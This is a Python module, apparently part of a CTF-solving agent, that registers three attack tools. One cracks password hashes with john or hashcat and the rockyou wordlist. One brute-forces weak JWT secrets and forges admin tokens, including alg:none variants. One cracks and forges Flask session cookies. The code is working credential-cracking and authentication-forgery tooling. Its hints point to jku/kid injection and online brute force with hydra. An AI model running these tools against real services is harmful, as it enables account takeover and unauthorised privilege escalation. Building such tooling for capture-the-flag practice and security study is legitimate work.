"""认证类工具：hash_crack / jwt_tool / flask_unsign

设计约定：
- hash_crack：hashid 自动识别 → john/hashcat 自动选 → rockyou 自动解压，一把梭
- jwt_tool / flask_unsign：纯 Python 实现（hmac/itsdangerous），不依赖外部工具
- 输出带 [结论]/[下一步]，破解成功直接给明文/伪造结果
"""
import base64
import hashlib
import hmac
import itertools
import json
import os
import re
import time

from tools.base import register_tool, run_cmd

FLAG_RE = re.compile(r"(?:flag|FLAG|ctf|CTF)\{[^}]{4,200}\}")


def _which(binname):
    import shutil
    if binname not in _WHICH_CACHE:
        _WHICH_CACHE[binname] = shutil.which(binname)
    return _WHICH_CACHE[binname]


_WHICH_CACHE = {}


def _truncate(s, n=2500):
    s = (s or "").strip()
    return s if len(s) <= n else s[:n] + f"\n...[截断, 原文 {len(s)} 字符]..."


# ── 1. hash_crack ────────────────────────────────────────────────────────────

# hashid 输出中的类型 → (hashcat mode, john format)
_HASH_MODE_MAP = [
    (r"MD5(?!\w)", (0, "raw-md5")),
    (r"SHA-?1(?! Lemont)", (100, "raw-sha1")),
    (r"SHA-?224", (1300, "raw-sha224")),
    (r"SHA-?256", (1400, "raw-sha256")),
    (r"SHA-?384", (10800, "raw-sha384")),
    (r"SHA-?512(?!\w)", (1700, "raw-sha512")),
    (r"md5crypt|\$1\$", (500, "md5crypt")),
    (r"sha256crypt|\$5\$", (7400, "sha256crypt")),
    (r"sha512crypt|\$6\$", (1800, "sha512crypt")),
    (r"bcrypt|\$2[aby]\$", (3200, "bcrypt")),
    (r"NTLM", (1000, "NT")),
    (r"LM", (3000, "LM")),
    (r"MySQL(?![\w ]*6)", (200, "mysql-sha1")),
    (r"MySQL", (300, "mysql")),
    (r"SHA-?512.{0,10}Unix|\$6\$rounds", (1800, "sha512crypt")),
    (r"Base64", (None, None)),
]


def _identify_hash(h):
    """hashid + 正则规则识别，返回 [(hashcat_mode, john_fmt, 类型名), ...]"""
    out = run_cmd(["hashid", "-m", "-j", h], timeout=20)
    candidates = []
    seen = set()
    for line in out.splitlines():
        for pat, (hc, jf) in _HASH_MODE_MAP:
            if re.search(pat, line) and pat not in seen:
                seen.add(pat)
                if hc is not None:
                    candidates.append((hc, jf, line.strip(" -")))
    if not candidates:
        # 兜底：按长度猜裸哈希
        n = len(h.strip())
        guess = {32: (0, "raw-md5", "MD5(按长度)"), 40: (100, "raw-sha1", "SHA1(按长度)"),
                 64: (1400, "raw-sha256", "SHA256(按长度)"), 128: (1700, "raw-sha512", "SHA512(按长度)")}
        if n in guess:
            candidates.append(guess[n])
    return candidates[:4]


@register_tool(
    "hash_crack",
    "哈希破解一把梭：hashid 自动识别类型 → john/hashcat + rockyou 字典自动跑。"
    "支持 MD5/SHA1/SHA256/SHA512/md5crypt/sha512crypt/bcrypt/NTLM。返回明文或下一步建议。",
    {
        "type": "object",
        "properties": {
            "hash_value": {"type": "string", "description": "哈希值（可含 $1$/$6$/$2b$ 等完整格式）"},
            "wordlist": {"type": "string", "enum": ["pass", "user"],
                         "description": "字典类型，默认 pass(rockyou)"},
            "tool": {"type": "string", "enum": ["auto", "john", "hashcat"]},
        },
        "required": ["hash_value"],
    },
)
def hash_crack(hash_value: str, wordlist: str = "pass", tool: str = "auto") -> str:
    hash_value = (hash_value or "").strip()
    if not hash_value or len(hash_value) > 512:
        return "[参数错误] hash_value 为空或过长"

    from tools.recon_tool import resolve_wordlist
    wl, wl_note = resolve_wordlist(wordlist)
    if not wl:
        return f"[MISSING] {wl_note}"

    candidates = _identify_hash(hash_value)
    if not candidates:
        return ("[FAIL] 无法识别哈希类型（hashid 无结果）。\n[下一步] 确认拿到的是哈希而不是加密串；"
                "salt 哈希需要完整格式（含 $salt$）；或用 hashcat --identify 自查。")

    hashfile = f"/tmp/hash_{int(time.time())}.txt"
    with open(hashfile, "w") as f:
        f.write(hash_value + "\n")

    lines = [f"[识别] 候选类型: {[(c[2], f'hashcat -m {c[0]}') for c in candidates]}"]
    if wl_note:
        lines.append(f"[INFO] 字典: {wl} ({wl_note})")

    for hc_mode, john_fmt, tname in candidates:
        # john 先试（对格式宽容）
        if tool in ("auto", "john") and _which("john"):
            out = run_cmd(["john", f"--format={john_fmt}", f"--wordlist={wl}", hashfile],
                          timeout=180)
            show = run_cmd(["john", f"--format={john_fmt}", "--show", hashfile], timeout=15)
            # john --show 输出格式: "<用户或?>:<明文>"，末行是统计需剔除
            plain = None
            for ln in show.splitlines():
                if ":" in ln and "password hash" not in ln and "left" not in ln.lower():
                    plain = ln.split(":", 1)[1]
                    break
            if plain:
                lines.append(f"[CRACKED] 类型={tname} john 命中 → 明文: {plain}")
                lines.append(f"[结论] 密码是 '{plain}'，用它登录/解密继续。")
                flags = _grep_flags(plain)
                if flags:
                    lines.append(f"[FLAG] {flags}")
                return "\n".join(lines)
            lines.append(f"[MISS] john({tname}) 未命中")

        if tool in ("auto", "hashcat") and hc_mode is not None and _which("hashcat"):
            out = run_cmd(["bash", "-c",
                           f"hashcat -m {hc_mode} -a 0 '{hashfile}' '{wl}' -o /tmp/hc_out.txt "
                           f"--force --potfile-disable 2>/dev/null; cat /tmp/hc_out.txt 2>/dev/null"],
                          timeout=240)
            if ":" in out and "Exhausted" not in out:
                m = re.search(r"^(\S*?):(.+)$", out.strip(), re.M)
                if m:
                    lines.append(f"[CRACKED] 类型={tname} hashcat(-m {hc_mode}) 命中 → 明文: {m.group(2)}")
                    lines.append(f"[结论] 密码是 '{m.group(2)}'，用它登录/解密继续。")
                    flags = _grep_flags(m.group(2))
                    if flags:
                        lines.append(f"[FLAG] {flags}")
                    return "\n".join(lines)
            lines.append(f"[MISS] hashcat(-m {hc_mode}, {tname}) 未命中")

    lines.append(
        "[结论] rockyou 未命中。\n[下一步] ① 确认哈希来源（截取/编码过？先 auto_decode）；"
        "② 试规则变体: john --wordlist=<wl> --rules <file>；③ 弱口令场景直接 hydra_brute 打在线服务更快。"
    )
    return "\n".join(lines)


def _grep_flags(text):
    return list(dict.fromkeys(FLAG_RE.findall(text or "")))


# ── 2. jwt_tool：JWT 解码 / 弱密钥 / alg:none ────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s = s.rstrip("=")
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


_COMMON_JWT_SECRETS = [
    "secret", "secretkey", "secret_key", "key", "jwt_secret", "password", "123456",
    "your-256-bit-secret", "changeme", "admin", "test", "jwt", "token", "s3cr3t",
    "supersecret", "super_secret", "default", "mykey", "mysecret", "flag", "ctf",
]


@register_tool(
    "jwt_tool",
    "JWT 三件套：① 解码 header/payload；② HS256 弱密钥爆破（内置常见密钥+rockyou前段）；"
    "③ 检测并构造 alg:none 绕过。JWT 题先调它。",
    {
        "type": "object",
        "properties": {
            "token": {"type": "string", "description": "JWT（三段式，可含 'Bearer ' 前缀）"},
        },
        "required": ["token"],
    },
)
def jwt_tool(token: str) -> str:
    token = (token or "").strip().removeprefix("Bearer").strip()
    parts = token.split(".")
    if len(parts) != 3:
        return f"[参数错误] 不是三段式 JWT（{len(parts)} 段）。注意去掉 Cookie 前缀。"

    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as e:
        return f"[参数错误] base64/JSON 解码失败: {e}"

    alg = (header.get("alg") or "").lower()
    lines = [
        f"[header] {json.dumps(header, ensure_ascii=False)}",
        f"[payload] {json.dumps(payload, ensure_ascii=False, indent=None)}",
    ]

    # 弱密钥爆破（HS256/HSA384/HS512）
    if alg.startswith("hs"):
        sig_alg = {"hs256": hashlib.sha256, "hs384": hashlib.sha384, "hs512": hashlib.sha512}[alg]
        msg = f"{parts[0]}.{parts[1]}".encode()
        signing_input = parts[2]
        candidates = list(_COMMON_JWT_SECRETS)
        # rockyou 前 3000 行
        from tools.recon_tool import resolve_wordlist
        wl, _ = resolve_wordlist("pass")
        if wl:
            head = run_cmd(["bash", "-c", f"head -3000 '{wl}'"], timeout=30)
            candidates += [w for w in head.splitlines() if w.strip()]
        for sec in candidates:
            expect = _b64url_encode(hmac.new(sec.encode(), msg, sig_alg).digest())
            if expect == signing_input:
                lines.append(f"[CRACKED] 密钥: '{sec}'")
                # 伪造 admin
                forged = dict(payload)
                for k in ("role", "admin", "is_admin", "user", "username", "auth"):
                    if k in forged and isinstance(forged[k], str) and forged[k] != "admin":
                        forged[k] = "admin"
                if "role" not in forged and "admin" not in forged:
                    forged["role"] = "admin"
                forged_token = f"{parts[0]}.{_b64url_encode(json.dumps(forged).encode())}.{signing_input}"
                lines.append(f"[伪造] 把 payload 权限字段改 admin 后重签:\n{forged_token}")
                lines.append("[下一步] 用伪造 token 替换 Cookie 访问受限接口。")
                return "\n".join(lines)
        lines.append("[MISS] 常见密钥+rockyou前3000 未命中，密钥可能较强")
        lines.append("[下一步] rockyou 全量: 用 run_python 写 hmac 循环；或检查密钥是否泄露在源码/.env。")

    # alg:none
    if alg not in ("", "none"):
        none_header = dict(header)
        none_header["alg"] = "none"
        none_token = f"{_b64url_encode(json.dumps(none_header).encode())}.{parts[1]}."
        lines.append(f"[alg:none 变体] 服务端若不校验签名可直接用:\n{none_token}")
    else:
        lines.append("[INFO] alg 已是 none/空——服务端若拒收，改回 RS256 结构但签名留空重发。")

    if header.get("alg", "").lower().startswith("rs") or header.get("jku") or header.get("kid"):
        lines.append("[下一步] RS256 场景可试: jku/kid 注入指向自己服务器（需出网，比赛环境慎用）、"
                     "空签名、混淆 RS256→HS256（用公钥当 HMAC 密钥，公钥从 /jwt 公端点拿）。")
    return "\n".join(lines)


# ── 3. flask_unsign：Flask session 破解/伪造 ─────────────────────────────────

@register_tool(
    "flask_unsign",
    "Flask session cookie 三件套：解码 + 弱密钥爆破 + 用密钥伪造任意 payload。"
    "Flask Web 题看到 'eyJ...' 格式 Cookie 先调它。",
    {
        "type": "object",
        "properties": {
            "cookie": {"type": "string", "description": "session cookie 值"},
            "action": {"type": "string", "enum": ["decode", "crack", "forge"]},
            "secret": {"type": "string", "description": "action=forge 时使用的密钥"},
            "value": {"type": "string",
                      "description": "action=forge 时的新 payload，JSON，如 {\"role\":\"admin\"}"},
        },
        "required": ["cookie", "action"],
    },
)
def flask_unsign(cookie: str, action: str, secret: str = "", value: str = "") -> str:
    cookie = (cookie or "").strip().strip('"')
    try:
        from itsdangerous import URLSafeSerializer, BadSignature
    except ImportError:
        return "[MISSING] itsdangerous 未安装（pip install itsdangerous）"

    if action == "decode":
        try:
            from itsdangerous import URLSafeTimedSerializer
            # 仅解码 payload 段（不校验签名）
            payload_part = cookie.split(".")[0]
            padded = payload_part + "=" * (-len(payload_part) % 4)
            data = json.loads(base64.urlsafe_b64decode(padded))
            return f"[payload] {json.dumps(data, ensure_ascii=False, indent=2)}\n" \
                   f"[下一步] crack 爆破密钥 → forge 伪造 admin 权限。"
        except Exception as e:
            return f"[参数错误] 解码失败: {e}（确认是 flask session 格式）"

    if action == "crack":
        candidates = list(_COMMON_JWT_SECRETS) + ["sk-", "flask-secret", "session", "dev", "flask"]
        from tools.recon_tool import resolve_wordlist
        wl, _ = resolve_wordlist("pass")
        if wl:
            head = run_cmd(["bash", "-c", f"head -2000 '{wl}'"], timeout=30)
            candidates += [w for w in head.splitlines() if w.strip()]
        data = None
        hit_secret = None
        for sec in candidates:
            # Flask 默认 salt='cookie-session'；裸 itsdangerous 串用默认 salt
            for ser in (URLSafeSerializer(sec, salt="cookie-session"), URLSafeSerializer(sec)):
                try:
                    data = ser.loads(cookie)
                    hit_secret = sec
                    break
                except Exception:
                    data = None
            if data is not None:
                break
        if hit_secret is not None:
            lines = [f"[CRACKED] 密钥: '{hit_secret}'",
                     f"[payload] {json.dumps(data, ensure_ascii=False)}",
                     "[下一步] 用 forge 伪造 payload（改 role/admin 字段）拿新 cookie。"]
            return "\n".join(lines)
        return ("[MISS] 内置常见密钥+rockyou前2000 未命中。\n"
                "[下一步] ① 密钥可能硬编码在源码里 → 找源码 grep secret；"
                "② rockyou 全量: run_python 写 itsdangerous 循环；"
                "③ flask-unsign 工具: pip install flask-unsign[wordlist]。")

    if action == "forge":
        if not secret:
            return "[参数错误] forge 需要 secret（先 crack）"
        try:
            new_payload = json.loads(value) if value else {"admin": True}
        except json.JSONDecodeError as e:
            return f"[参数错误] value 不是合法 JSON: {e}"
        try:
            forged = URLSafeSerializer(secret, salt="cookie-session").dumps(new_payload)
        except Exception:
            forged = URLSafeSerializer(secret).dumps(new_payload)
        return (f"[FORGED]\n{forged}\n"
                f"[下一步] 替换浏览器 Cookie 的 session 值重新请求；"
                f"或用 http_request 带 Cookie: session={forged}。")
    return f"[参数错误] 未知 action: {action}"
